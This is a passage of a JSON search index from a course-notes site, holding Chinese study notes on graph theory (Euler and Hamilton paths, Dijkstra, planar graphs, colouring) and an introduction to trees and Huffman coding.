path\uff1a\u4e0d\u4e8c\u6b21\u7ecf\u8fc7\u540c\u4e00\u4e2aedge\u7684path</li> <li>\u8fde\u901a\uff1a\u4efb\u610f\u4e00\u5bf9\u70b9\u4e4b\u95f4\u90fd\u6709 simple path \u76f8\u8fde</li> <li>Cut vertex (\u5272\u70b9): \u4ece\u8fde\u901a\u56fe\u91cc\u5220\u9664\u5272\u70b9\uff0c\u5c31\u4ea7\u751f\u4e0d\u8fde\u901a\u7684\u5b50\u56fe</li> <li>Cut edge/bridge (\u5272\u8fb9\uff0c\u6865): \u4ece\u8fde\u901a\u56fe\u91cc\u5220\u9664\u5272\u8fb9\uff0c\u5c31\u4ea7\u751f\u4e0d\u8fde\u901a\u7684\u5b50\u56fe</li> <li>Connected Component\uff1a\u6700\u5927\u8fde\u901a\u5b50\u56fe </li> </ul> <p>Counting Path\uff1aThe number of different paths of length <code>r</code> from \\(v_i\\) to \\(v_j\\) \u7b49\u4e8e \\(A^r[i,j]\\)</p> <p>Example</p> <p></p> <ul> <li>\u5bf9\u4e8e\u6709\u5411\u56fe\uff0c\u8fd8\u5206\u4e3a\u5f3a\u8fde\u901a\u548c\u5f31\u8fde\u901a<ul> <li>Strongly connected\uff1a\u4e25\u683c\u6309\u65b9\u5411\u8fde\u901a</li> <li>Weakly connected\uff1a\u5c06\u6709\u5411\u56fe\u770b\u4f5c\u65e0\u5411\u56fe\u770b\u5f85</li> </ul> </li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter10/#105-euler-and-hamilton-paths","title":"10.5 Euler and Hamilton Paths","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter10/#euler-path-and-circuit","title":"Euler Path and circuit","text":"<ul> <li>Euler Path: \u5305\u542b\u00a0\u6bcf\u6761\u8fb9\u00a0\u7684 simple path</li> <li>Euler Circuit: \u5305\u542b\u6bcf\u6761\u8fb9\u7684 simple circuit</li> <li>Euler Graph: \u5305\u542b Euler Circuit \u7684\u56fe</li> </ul> \u65e0\u5411\u56fe\u6709\u5411\u56fe <ul> <li>\u4e00\u4e2a\u8fde\u901a\u56fe\u62e5\u6709 \u6b27\u62c9\u56de\u8def \u5f53\u4e14\u4ec5\u5f53\u6bcf\u4e2aVertex\u90fd\u662f\u5076\u5ea6\u6570</li> <li>\u4e00\u4e2a\u8fde\u901a\u56fe\u62e5\u6709 \u6b27\u62c9\u8def\u5f84 \u5f53\u4e14\u4ec5\u5f53\u4ec5\u6709\u4e24\u4e2aVertex\u662f\u5947\u5ea6\u6570</li> </ul> <p>Example</p> <p></p> <ul> <li>\u6709\u00a0\u6b27\u62c9\u56de\u8def\u00a0\u5f53\u4e14\u4ec5\u5f53\uff1a<ul> <li>\u5f31\u8fde\u901a</li> <li>\u6bcf\u4e2a\u70b9\u7684\u51fa\u5ea6\u3001\u5165\u5ea6\u76f8\u7b49</li> </ul> </li> <li>\u6709\u00a0\u6b27\u62c9\u8def\u5f84\u00a0\u5f53\u4e14\u4ec5\u5f53\uff1a<ul> <li>\u5f31\u8fde\u901a</li> <li>\u6709\u4e14\u4ec5\u6709\u4e24\u4e2a\u70b9\uff0c\u4e00\u4e2a\u5165\u5ea6\u6bd4\u51fa\u5ea6\u5927 1\uff0c\u4e00\u4e2a\u51fa\u5ea6\u6bd4\u5165\u5ea6\u5927 1</li> </ul> </li> </ul> <p>Example</p> <p></p>"},{"location":"Courses/DiscreteMathematics/note/Chapter10/#hamilton-path-and-circuit","title":"Hamilton path and circuit","text":"<p>\u5982\u65e0\u7279\u522b\u8bf4\u660e\uff0c\u8ba8\u8bba\u54c8\u5bc6\u987f\u56de\u8def\u65f6\u7686\u4e3a\u65e0\u5411\u56fe</p> <ul> <li>Hamilton Path: \u5305\u542b\u00a0\u6bcf\u4e2a\u8282\u70b9\uff08\u4ec5\u4e00\u6b21\uff09 \u7684 simple path</li> <li>Hamilton Circuit: \u9664\u4e86\u8d77\u70b9\u548c\u7ec8\u70b9\u5305\u542b\u4e24\u6b21\uff0c\u5176\u4ed6\u6bcf\u4e2a\u8282\u70b9\u5305\u542b\u4e00\u6b21\u7684 simple circuit</li> <li>Hamilton Graph: \u542b Hamilton Circuit \u7684\u56fe</li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter10/#hamilton-circuit","title":"Hamilton circuit \u5224\u65ad\u6761\u4ef6","text":"\u5145\u5206\u6761\u4ef6\u5fc5\u8981\u6761\u4ef6 <ul> <li>Dirac Theorem (\u72c4\u62c9\u514b\u5b9a\u7406): \u5982\u679c\u00a0\ud835\udc3a\u00a0\u662f\u6709\u00a0\ud835\udc5b\u00a0\u4e2a\u9876\u70b9\u7684\u7b80\u5355\u56fe\uff0c\u5176\u4e2d\u00a0\ud835\udc5b\u22653\uff0c\u5e76\u4e14\u00a0\ud835\udc3a\u00a0\u4e2d\u6bcf\u4e2a\u9876\u70b9\u7684\u5ea6\u90fd\u81f3\u5c11\u4e3a\u00a0\\(\\frac{n}{2}\\)\uff0c\u5219\u00a0\ud835\udc3a\u00a0\u6709\u54c8\u5bc6\u987f\u56de\u8def</li> <li>Ore Theorem (\u6b27\u5c14\u5b9a\u7406): \u5982\u679c\u00a0\ud835\udc3a\u00a0\u662f\u6709\u00a0\ud835\udc5b\u00a0\u4e2a\u9876\u70b9\u7684\u7b80\u5355\u56fe\uff0c\u5176\u4e2d\u00a0\ud835\udc5b\u22653\uff0c\u5e76\u4e14\u5bf9\u4e8e\u00a0\ud835\udc3a\u00a0\u4e2d\u6bcf\u4e00\u5bf9\u4e0d\u76f8\u90bb\u7684\u9876\u70b9\u00a0\ud835\udc62\u00a0\u548c\u00a0\ud835\udc63\u00a0\u6765\u8bf4\uff0c\u90fd\u6709\u00a0deg\u2061(\ud835\udc62)+deg\u2061(\ud835\udc63)\u2265\ud835\udc5b\uff0c\u5219\u00a0\ud835\udc3a\u00a0\u6709\u54c8\u5bc6\u987f\u56de\u8def</li> <li>\u72c4\u62c9\u514b\u5b9a\u7406\u53ef\u4ee5\u770b\u505a\u6b27\u5c14\u5b9a\u7406\u7684\u63a8\u8bba</li> <li>\u5b58\u5728\u54c8\u5bc6\u987f\u56fe\u65e2\u4e0d\u6ee1\u8db3 Dirac \u4e5f\u4e0d\u6ee1\u8db3 Ore \u7684\u6761\u4ef6</li> </ul> <ul> <li>\u5982\u679c\u4e00\u4e2a\u56fe\u5b58\u5728\u54c8\u5bc6\u987f\u56de\u8def\uff0c\u5219\u8be5\u56fe\u662f\u4e8c\u8fde\u901a\u7684<ul> <li>\u4e8c\u8fde\u901a\uff08biconnected\uff09\u662f\u6307\u4e00\u4e2a\u65e0\u5411\u56fe\u4e2d\uff0c\u5982\u679c\u4ece\u56fe\u4e2d\u5220\u9664\u4efb\u610f\u4e00\u4e2a\u9876\u70b9\uff0c\u5269\u4f59\u7684\u56fe\u4ecd\u7136\u662f\u8fde\u901a\u7684\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u56fe\u4e2d\u4e0d\u5b58\u5728\u5272\u70b9</li> </ul> </li> <li>\u9664\u4e86\u4e0d\u5b58\u5728\u5272\u70b9\u5916\uff0c\u54c8\u5bc6\u987f\u56fe\u4e5f\u4e0d\u5b58\u5728\u5272\u8fb9<ul> <li>\u663e\u7136\u54c8\u5bc6\u987f\u56fe\u662f\u4e00\u4e2a\u6709\u5305\u542b\u6240\u6709\u9876\u70b9\u7684\u5708\u7684\u56fe\uff0c\u5220\u9664\u6389\u8fd9\u4e2a\u5708\u4e0a\u4efb\u4e00\u9876\u70b9\u6216\u8005\u4efb\u4e00\u8fb9\uff0c\u54c8\u5bc6\u987f\u56fe\u4ecd\u7136\u8fde\u901a\uff0c\u5220\u9664\u5708\u5916\u8fb9\u5219\u5bf9\u5708\u65e0\u5f71\u54cd\uff0c\u56e0\u6b64\u54c8\u5bc6\u987f\u56fe\u4e0d\u5b58\u5728\u5272\u8fb9</li> <li>\u6362\u8a00\u4e4b\uff0c\u6709\u5272\u70b9\u7684\u56fe\u4e00\u5b9a\u4e0d\u662f\u54c8\u5bc6\u987f\u56fe</li> </ul> </li> <li>\u5982\u679c\u4e00\u4e2a\u56fe\u5b58\u5728\u54c8\u5bc6\u987f\u56de\u8def\uff0c\u5219\u6bcf\u4e2a\u70b9\u7684\u5ea6\u90fd\u5927\u4e8e 1</li> <li>\u5982\u679c\u4e00\u4e2a\u56fe\u4e2d\u5b58\u5728\u54c8\u5bc6\u987f\u56de\u8def\uff0c\u5e76\u4e14\u8be5\u56fe\u4e2d\u6709\u4e00\u4e2a\u5ea6\u6570\u4e3a 2 \u7684\u9876\u70b9\uff0c\u5219\u4e0e\u8be5\u9876\u70b9\u76f8\u8fde\u7684\u4e24\u6761\u8fb9\u90fd\u5fc5\u987b\u5c5e\u4e8e\u54c8\u5bc6\u987f\u56de\u8def</li> <li>\u5728\u6784\u9020\u54c8\u5bc6\u987f\u56de\u8def\u65f6\uff0c\u5982\u679c\u5df2\u7ecf\u7ecf\u8fc7\u4e86\u4e00\u4e2a\u9876\u70b9\uff0c\u5219\u9664\u4e86\u7528\u4e8e\u6784\u9020\u54c8\u5bc6\u987f\u56de\u8def\u7684\u4e24\u6761\u8fb9\u4e4b\u5916\uff0c\u4e0e\u8be5\u9876\u70b9\u76f8\u8fde\u7684\u5176\u4ed6\u8fb9\u90fd\u53ef\u4ee5\u4e0d\u518d\u8003\u8651\uff08\u56e0\u4e3a\u54c8\u5bc6\u987f\u56de\u8def\u53ea\u80fd\u7ecf\u8fc7\u6bcf\u4e2a\u9876\u70b9\u6070\u597d\u4e00\u6b21\uff09</li> <li>\u5220\u9664\u54c8\u5bc6\u987f\u56fe n \u4e2aVertex\u53ca\u5176\u76f8\u8fde\u7684\u8fb9\uff0c\u5219\u5269\u4f59\u90e8\u5206\u62e5\u6709\u7684Connected Components\u7684\u6570\u91cf\u4e00\u5b9a\u5c0f\u4e8e\u7b49\u4e8en</li> </ul> <p>Example</p> <p></p> <p>\u4e0a\u56fe\u4e0d\u542b\u6709\u54c8\u5bc6\u987f\u56de\u8def\uff0c\u56e0\u4e3a\u5220\u9664\u5708\u51fa\u7684\u4e94\u4e2a\u9876\u70b9\u540e\uff0c\u6b64\u56fe\u5269\u4f59\u516d\u4e2aConnected Components\uff0c\u4e0d\u7b26\u5408\u54c8\u5bc6\u987f\u56fe\u7684\u5fc5\u8981\u6761\u4ef6</p> \u5982\u4f55\u624b\u753bHamilton Circuit <p> \u4ee5\u6b64\u56fe\u4e3a\u4f8b\u5b50\uff0c\u7531\u4e8e\u70b9G\u3001A\u3001E\u3001D\u90fd\u4ec5\u6709\u4e24\u4e2a\u76f8\u90bb\u8fb9\uff0c\u56e0\u6b64\u8fd9\u56db\u4e2a\u9876\u70b9\u53ca\u5176\u76f8\u90bb\u8fb9\u4e00\u5b9a\u5728\u54c8\u5bc6\u987f\u56de\u8def\u4e2d\uff0c\u6b64\u65f6\u56de\u8def\u5305\u542b\u4e86\u5168\u90e8\u9876\u70b9\uff0c\u7531\u4e8eC\u5df2\u7ecf\u88ab\u7eb3\u5165\u56de\u8def\u4e2d\uff0c\u5220\u9664CF\u8fb9\u548cBC\u8fb9\uff0c\u5269\u4e0b\u7684\u8fb9\u548c\u70b9\u5c31\u662f\u54c8\u5bc6\u987f\u56de\u8def</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter10/#hamilton-path","title":"Hamilton Path \u5224\u65ad\u6761\u4ef6","text":"\u5fc5\u8981\u6761\u4ef6 <ul> <li>G is connected</li> <li>\u6700\u591a\u6709\u4e24\u4e2a\u9876\u70b9\u7684\u5ea6\u6570\u4e3a1<ul> <li>\u56e0\u4e3a\u54c8\u5bc6\u987f\u8def\u5f84\u7684\u8d77\u70b9\u548c\u7ec8\u70b9\u7684\u5ea6\u6570\u4e3a 1\uff0c\u800c\u8def\u5f84\u4e0a\u7684\u5176\u4ed6\u9876\u70b9\u90fd\u81f3\u5c11\u6709\u4e24\u6761\u8fb9\u4e0e\u4e4b\u76f8\u8fde\uff0c\u56e0\u6b64\u5b83\u4eec\u7684\u5ea6\u6570\u81f3\u5c11\u4e3a 2</li> </ul> </li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter10/#106-shortest-path-problems","title":"10.6 Shortest Path Problems","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter10/#dijkstra","title":"Dijkstra \u7b97\u6cd5","text":"<p>\u7528dfs(bfs\u4e5f\u53ef)\uff0c\u8bb0\u5f55\u6700\u5c0f\u8def\u5f84\u957f\u5ea6\u3002</p> <p>\u5f53\u5f53\u524d\u957f\u5ea6\u5c0f\u4e8e\u5386\u53f2\u957f\u5ea6\uff0c\u5c31\u66f4\u65b0\uff1b\u5426\u5219\u7ed3\u675fdfs\u3002</p> <p>\u5f53\u5230\u8fbeDestination\uff0c\u7ed3\u675fdfs</p> <p>\u6b63\u7ecf\u7684\u65b9\u5f0f\uff1a</p> <ul> <li>1.\u521d\u59cb\u5316\uff1a\u5c06\u6240\u6709Vertex\u7684\u6700\u77ed\u8ddd\u79bb\u521d\u59cb\u5316\u4e3a\u65e0\u9650\u5927\uff0c\u5373 \\(d[v]=\\infty\\) </li> <li>2.\u5efa\u7acb\u4e00\u4e2a\u4f18\u5148\u961f\u5217(Heap)\uff0c\u7528\u4e8e\u4fdd\u5b58\u503c\u4e0d\u4e3a\u65e0\u9650\u5927\u7684\u4e14\u8fd8\u672a\u786e\u5b9a\u6700\u77ed\u8ddd\u79bb\u7684Vertex\uff0c\u5e76\u4e14\u5c06\u8d77\u70b9 \\(d[s]=0\\) \u52a0\u5165</li> <li>3.\u4eceHeap\u4e2d\u53d6\u51fa\u503c\u6700\u5c0f\u7684\u9876\u70b9u\uff0c\u5bf9\u4e8e\u4e0e\u5176\u76f8\u90bb\u7684\u6bcf\u4e2a\u9876\u70b9v\uff0c\u82e5 \\(d[u]+w(u,v)\\lt d[v]\\) \uff0c\u5219\u66f4\u65b0 \\(d[v]\\) \u7684\u503c\u5e76\u5c06v\u52a0\u5165Heap</li> <li>4.\u91cd\u590d3\u76f4\u5230\u7ec8\u70b9\u88ab\u4eceHeap\u4e2d\u53d6\u51fa\u3002\u7ed3\u679c\u5b58\u50a8\u5728 \\(d[Destination]\\) \u4e2d</li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter10/#107-planar-graphs","title":"10.7 Planar Graphs \u5e73\u9762\u56fe","text":"<ul> <li>Definition: \u82e5\u53ef\u4ee5\u5728\u5e73\u9762\u4e2d\u753b\u51fa\u4e00\u4e2a\u56fe\u800c\u8fb9\u6ca1\u6709\u4efb\u4f55\u4ea4\u53c9\uff08\u5176\u4e2d\u8fb9\u7684\u4ea4\u53c9\u662f\u8868\u793a\u8fb9\u7684\u76f4\u7ebf\u6216\u5f27\u7ebf\u5728\u5b83\u4eec\u7684\u516c\u5171\u7aef\u70b9\u4ee5\u5916\u7684\u5730\u65b9\u76f8\u4ea4\uff09\uff0c\u5219\u8fd9\u4e2a\u56fe\u662f\u5e73\u9762\u56fe</li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter10/#euler-formula","title":"Euler Formula","text":"<p>\u82e5G\u662f Connected Planar Simple Graph\uff0c\u5219 \\(r=e-v+2\\)</p> <p>Definition  \u5047\u5982R\u662fConnected Planar Simple Graph\u7684\u4e00\u4e2aRegion\uff0c\u5219R\u8fb9\u754c\u4e0a\u7684Edges\u7684\u6570\u91cf\u88ab\u79f0\u4e3a Degree of R with Notation \\(Deg(R)\\)</p> <ul> <li>\\(\\sum_{v _i\\in V}deg(v_i) =\\sum_{r _i\\in R}Deg(r_i) =2e\\)</li> <li>\u5982\u679c\u4e00\u4e2a\u8fb9\u4e3a Cut Edge \u7684\u8bdd\uff0c\u5b83\u5bf9 \\(Deg(R)\\) \u7684\u8d21\u732e\u5ea6\u4e3a2</li> </ul> Example <p> \\(Deg(R_1)  =12\\ \\ Deg(R_2)=4\\)</p> <p>\u63a8\u8bba\uff1a</p> <ul> <li>\u5982\u679cG\u662fConnected Planar Simple Graph\uff0c\u4e14 \\(v\\ge 3\\) \uff0c\u5219 \\(e\\le 3v-6\\)<ul> <li>\u8bc1\u660e\u8981\u70b9\uff1a\\(Deg(R)\\ge 3\\)  /  \\(2e=\\sum_{r _i\\in R}Deg(r_i) \\ge 3r =3(e-v+2)\\)</li> <li>\u56e0\u6b64 \\(K_5\\) \u4e0d\u662f\u5e73\u9762\u56fe</li> </ul> </li> <li>\u5982\u679cG\u662fConnected Planar Simple Graph\uff0c\u90a3\u4e48G\u4e00\u5b9a\u542b\u6709\u4e00\u4e2aDegree\u4e0d\u8d85\u8fc75\u7684Vertex</li> <li>\u5982\u679cG\u662fConnected Planar Simple Graph\uff0c\u4e14 \\(v\\ge 3\\) \u4ee5\u53ca\u6ca1\u6709\u957f\u5ea6\u4e3a3\u7684\u73af\uff0c\u90a3\u4e48 \\(e\\le 2v-4\\)<ul> <li>\\(Deg(R)\\ge 4\\)</li> </ul> </li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter10/#kuratowskis-theorem","title":"Kuratowski's Theorem","text":"<ul> <li>Elementary Subdivision (\u521d\u7b49\u7ec6\u5206)\uff1a\u82e5\u4e00\u4e2a\u56fe\u662f\u5e73\u9762\u56fe\uff0c\u5219\u901a\u8fc7\u5220\u9664\u4e00\u6761\u8fb9\u00a0{\ud835\udc62,\ud835\udc63}\u00a0\u5e76\u4e14\u6dfb\u52a0\u4e00\u4e2a\u65b0\u9876\u70b9\u00a0\ud835\udc64\u00a0\u548c\u4e24\u6761\u8fb9\u00a0(\ud835\udc62,\ud835\udc64)\u00a0\u4e0e\u00a0(\ud835\udc64,\ud835\udc63)\u00a0\u83b7\u5f97\u7684\u4efb\u4f55\u56fe\u4e5f\u662f\u5e73\u9762\u56fe\u3002\u4e5f\u5373\uff0c\u5e73\u9762\u56fe\u4e2d\u7684\u4e00\u6761\u8fb9\u901a\u8fc7\u6dfb\u52a0\u4e00\u4e2a\u70b9\u7684\u65b9\u5f0f\u53d8\u6210\u4e24\u6761\u8fb9\uff0c\u4e0d\u6539\u53d8\u5176\u662f\u5e73\u9762\u56fe\u7684\u6027\u8d28</li> <li>Homeomorphic (\u540c\u80da)\uff1a\u76f8\u540c\u7684\u56fe\u901a\u8fc7\u300c\u521d\u7b49\u7ec6\u5206\u300d\u5f97\u5230\u4e0d\u540c\u7684\u56fe\uff0c\u79f0\u5176\u4e4b\u95f4\u540c\u80da</li> <li>Theorem\uff1a\u4e00\u4e2a\u56fe\u662f\u00a0\u975e\u5e73\u9762\u56fe\u00a0\u5f53\u4e14\u4ec5\u5f53\u5176\u5305\u542b\u4e00\u4e2a\u540c\u80da\u4e8e\u00a0\\(K_5\\)\u00a0\u6216\u00a0\\(\ud835\udc3e_{3,3}\\)\u00a0\u7684\u5b50\u56fe</li> </ul> <p>Example</p> \u4f8b1\u4f8b2 <p> \u4e0a\u56fe\u5305\u542b\u540c\u80da\u4e8e \\(K_5\\) \u7684\u5b50\u56fe\uff0c\u56e0\u6b64\u5b83\u4e0d\u662f\u5e73\u9762\u56fe</p> <p> \u4e0a\u56fe\u5305\u542b\u540c\u80da\u4e8e \\(K_{3,3}\\) \u7684\u5b50\u56fe\uff0c\u56e0\u6b64\u5b83\u4e0d\u662f\u5e73\u9762\u56fe</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter10/#108-graph-coloring","title":"10.8 Graph Coloring","text":"<ul> <li>Dual Graph (\u5bf9\u5076\u56fe)\uff1a\u5e73\u9762\u56fe\u4e2d\uff0c\u4e00\u4e2a\u9762\u5bf9\u5e94\u4e00\u4e2a\u70b9\uff0c\u82e5\u4e24\u4e2a\u9762\u76f8\u90bb\uff0c\u5219\u4e24\u4e2a\u70b9\u4e4b\u95f4\u6709\u8fb9\u3002\u8fd9\u6837\u5f97\u5230\u7684\u56fe\u79f0\u4e3a\u5bf9\u5076\u56fe</li> </ul> <ul> <li>Coloring (\u7740\u8272)\uff1a\u6307\u5bf9\u8be5\u56fe\u7684\u6bcf\u4e2a\u9876\u70b9\u90fd\u6307\u5b9a\u4e00\u79cd\u989c\u8272\uff0c\u4f7f\u5f97\u6ca1\u6709\u4e24\u4e2a\u76f8\u90bb\u7684\u9876\u70b9\u989c\u8272\u76f8\u540c</li> <li>Chromatic Number of A Graph (\u7740\u8272\u6570)\uff1a\u7740\u8272\u8fd9\u4e2a\u56fe\u6240\u9700\u8981\u7684\u6700\u5c11\u989c\u8272\u6570\uff0c\u8bb0\u4f5c\u00a0\ud835\udf12(\ud835\udc3a)</li> <li>\u4e00\u822c\u6765\u8bf4\uff0c\u5f97\u5230\u00a0\ud835\udf12(\ud835\udc3a)=\ud835\udc58\u00a0\u7684\u65b9\u6cd5\u662f\u8bc1\u660e\u53ef\u4ee5\u7528\u00a0\ud835\udc58\u00a0\u4e2a\u989c\u8272\u7740\u8272\uff0c\u800c\u00a0\ud835\udc58\u22121\u00a0\u5219\u4e0d\u80fd\u7740\u8272<ul> <li>\ud835\udf12(\ud835\udc3a)\u00a0of\u00a0\\(\ud835\udc36_\ud835\udc5b\\):\u00a0\ud835\udc5b\u00a0\u4e3a\u5947\u6570\uff0c\u4e3a 3\uff0c\u53cd\u4e4b\u4e3a 2</li> <li>\ud835\udf12(\ud835\udc3a)\u00a0of\u00a0\\(\ud835\udc3e_\ud835\udc5b\\):\u00a0\ud835\udc5b</li> <li>\u82e5\u7b80\u5355\u56fe\u7684\u7740\u8272\u6570\u4e3a 2\uff0c\u8bf4\u660e\u5176\u662f\u4e8c\u5206\u56fe</li> </ul> </li> <li>\u56db\u8272\u5b9a\u7406\uff1a\u5e73\u9762\u56fe\u00a0\u7684\u7740\u8272\u6570\u4e0d\u8d85\u8fc7 4\uff0c\u975e\u5e73\u9762\u56fe\u53ef\u4ee5\u6709\u4efb\u610f\u5927\u7684\u7740\u8272\u6570</li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter11/","title":"CH 11. Trees","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter11/#ch-11-trees","title":"CH 11 : Trees","text":"<p> \u7ea6 1339 \u4e2a\u5b57  28 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter11/#111-introduction-to-trees","title":"11.1 Introduction to Trees","text":"<ul> <li>Tree: connected undirected graph with no simple circuits</li> <li>Forest: undirected graph with no simple circuits (collection of trees)</li> <li>\u4e00\u4e2a\u65e0\u5411\u56fe\u662f\u6811\u5f53\u4e14\u4ec5\u5f53\u5728\u5b83\u7684\u6bcf\u5bf9\u9876\u70b9\u4e4b\u95f4\u5b58\u5728\u552f\u4e00\u7b80\u5355\u901a\u8def</li> <li>\u9009\u5b9a\u4e00\u4e2a\u6839\u8282\u70b9\u540e\uff0c\u6811\u53ef\u4ee5\u88ab\u552f\u4e00\u5730\u753b\u51fa\uff08Rooted Tree\uff09</li> <li>Sibling: \u6709\u540c\u6837\u7236\u8282\u70b9\u7684\u8282\u70b9\u79f0\u4e3aSiblings</li> <li>Ancestors: \u4ece\u8be5\u8282\u70b9\u5230\u6839\u8282\u70b9Path\u4e0a\u6240\u6709\u8282\u70b9\u79f0\u4e3a\u8be5\u8282\u70b9\u7684Ancestors</li> <li>Descendants: \u6240\u6709\u4ee5\u8be5\u8282\u70b9\u4e3aAncestors\u7684\u8282\u70b9\u79f0\u4e3a\u8be5\u8282\u70b9\u7684Descendants</li> <li>Internal Vertex: \u6709\u5b69\u5b50\u7684\u70b9\u53eb\u5185\u70b9</li> <li>Ordered Rooted Tree: \u6bcf\u4e2a\u5185\u70b9\u7684\u5b69\u5b50\u90fd\u6392\u5e8f\u7684\u6709\u6839\u6811\uff0c\u6309\u4ece\u5de6\u5230\u53f3\u7684\u987a\u5e8f</li> <li>Level: The level of vertex v in a rooted tree is the length of the unique path from the root to v \u4f8b\u5982\uff0c\u53ea\u6709Root\u7684\u6811\uff0cLevel\u548cHeight\u90fd\u4e3a0\uff0c\u7a7a\u6811\u7684Height\u4e3a-1</li> <li>Height: The height of a rooted tree is the maximum of the levels of its vertices</li> <li>Balance: \u6240\u6709\u53f6\u8282\u70b9\u90fd\u5728Levels h or h-1\u7684Rooted Tree \u5e73\u8861\u6811</li> <li>\ud835\udc5b\u00a0\u4e2a\u9876\u70b9\u7684\u6811\u542b\u6709\u00a0\ud835\udc5b\u22121\u00a0\u6761\u8fb9</li> <li>\u6811\u90fd\u662f\u4e8c\u90e8\u56fe\uff0c\\(\ud835\udc3e_{1,\ud835\udc5b}\\)\u00a0\u548c\u00a0\\(\ud835\udc3e_{\ud835\udc5a,1}\\)\u00a0\u662f\u6811</li> </ul> <p>Counting</p> <p>\u7ed9\u51fa\u8282\u70b9\u6570n\uff0c\u8ba9\u4f60\u8ba1\u7b97\u53ef\u4ee5\u6784\u9020\u51faTree\u7684\u6570\u91cf\uff0c\u8bb0\u5f97\u5173\u6ce8\u662funrooted tree\u8fd8\u662frooted tree</p> <p>\u4f8b\u5b50\uff1a n=5 , unrooted=3 , rooted=9.</p> <p>\u8ba1\u7b97Rooted Tree\u4e2a\u6570\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u4eceThe longest path from root\u8fd9\u4e2a\u89d2\u5ea6\u5207\u5165</p> <ul> <li>\u5bf9\u4e8e\u4efb\u4f55\u6811\uff0c\u90fd\u6709 \\(|E|=|V|-1\\)</li> <li>\u5bf9\u4e8eFull m-ary Tree with i internal vertices\uff0c\u5171\u6709 n=mi+1 vertices (Tips:n=l+i\uff0c\u56e0\u6b64\u4e5f\u53ef\u4ee5\u7b97\u51fa\u6765\u53f6\u8282\u70b9\u7684\u4e2a\u6570)<ul> <li>\u6ee1m\u53c9\u6811\uff1a\u503c\u8be5\u6811\u7684\u8282\u70b9\u8981\u4e48\u662f\u53f6\u8282\u70b9\u8981\u4e48\u662f\u6ee1\u8282\u70b9</li> </ul> </li> </ul> <p>Example</p> <p>How many leaves does a full 3-ary tree with 100 vertices have?</p> <p>\\(i=\\frac{n-1}{m}=\\frac{100-1}{3}=33\\) \uff0c \\(l=n-i=100-33=67\\)</p> <p>\u4f8b\u5b502</p> <p>(\u00a3) There is an undirected tree with 2 vertices of 4 degrees, 3 vertices of 3 degrees. The remaining vertices are leaves. Then it contains 8 leaves</p> <p>2 * 4 + 3 * 3 + l = 2e = 2(2 + 3 + l -1)=2l + 8</p> <p>l = 9</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter11/#112-applications-of-trees","title":"11.2 Applications of Trees","text":"Binary Search Tree \u4e8c\u53c9\u641c\u7d22\u6811Decision Tree \u51b3\u7b56\u6811Prefix Codes \u524d\u7f00\u7801Huffman Tree \u54c8\u592b\u66fc\u6811 <p>\u5f88\u57fa\u672c\u7684\u6784\u9020</p> <p>\u6bcf\u4e00\u4e2aInternal Vertex\u5bf9\u5e94\u4e00\u4e2a\u51b3\u7b56</p> <ul> <li>\u4e3a\u4e86\u786e\u4fdd\u4e00\u4e32bit string\u5bf9\u5e94\u4e0d\u8d85\u8fc7\u4e00\u79cdLetter\u5e8f\u5217\uff0c\u4e00\u4e2aLetter\u7684\u7f16\u7801\u4e0d\u5e94\u8be5\u51fa\u73b0\u5728\u53e6\u4e00\u4e2aLetter\u7f16\u7801\u7684\u5f00\u5934\uff0c\u5982\uff1a e:0,a:10,b:110</li> <li>\u7528\u4e00\u4e2aBinary Tree\u6765\u6784\u9020\u7f16\u7801\uff0c\u5f80\u5de6\u7684\u8fb9\u5bf9\u5e940\uff0c\u5f80\u53f3\u7684\u8fb9\u5bf9\u5e941\uff0c\u5219\u7f16\u7801\u4e3a\u8be5\u6811\u53f6\u8282\u70b9\u5bf9\u5e94\u7684\u5e8f\u5217\uff1a </li> </ul> <p>\u4f7f\u5f97\u6bcf\u4e2a\u53f6\u8282\u70b9\u90fd\u6709\u6743\u503c\uff0c\u5219\u5b9a\u4e49 \u8282\u70b9\u7684\u5e26\u6743\u8def\u5f84\u957f\u5ea6 \u4e3a\u8282\u70b9\u5230Root\u7684\u8def\u5f84\u957f\u5ea6\u4e0e\u8282\u70b9\u6743\u503c\u7684\u4e58\u79ef\u3002\u79f0\u6240\u6709\u8282\u70b9\u7684\u5e26\u6743\u8def\u5f84\u957f\u5ea6\u4e4b\u548c\u4e3a\u6811\u7684\u5e26\u6743\u8def\u5f84\u957f\u5ea6\u3002</p> <p>\u5176\u4e2d\uff0c\u5e26\u6743\u8def\u5f84\u957f\u5ea6\u6700\u77ed\u7684\u6811\u79f0\u4e3aHuffman Tree\uff0c\u6309\u7167\u54c8\u592b\u66fc\u6811\u8fdb\u884cPrefix Coding\uff0c\u5f97\u5230\u54c8\u592b\u66fc\u7f16\u7801</p> <p>\u6784\u9020\u54c8\u592b\u66fc\u6811\u7684\u54c8\u592b\u66fc\u7b97\u6cd5\u5982\u4e0b\uff1a</p> <ul> <li>\u6709n\u4e2a\u539f\u59cb\u8282\u70b9\uff0c\u6743\u503c\u5206\u522b\u4e3a\\(\\{W_1 ,W_2,..., W_n\\}\\) \uff0c\u6784\u9020\u6210n\u9897\u4e8c\u53c9\u6811\u7684\u96c6\u5408\\(F=\\{T_1, T_2,... ,T_n\\}\\) \uff0c\u5176\u4e2d\u6bcf\u9897\u4e8c\u53c9\u6811 \\(T_i\\) \u53ea\u6709\u4e00\u4e2a\u5e26\u6743\u4e3a \\(W_i\\) \u7684\u6839\u8282\u70b9\uff0c\u5de6\u53f3\u5b69\u5b50\u5747\u7a7a</li> 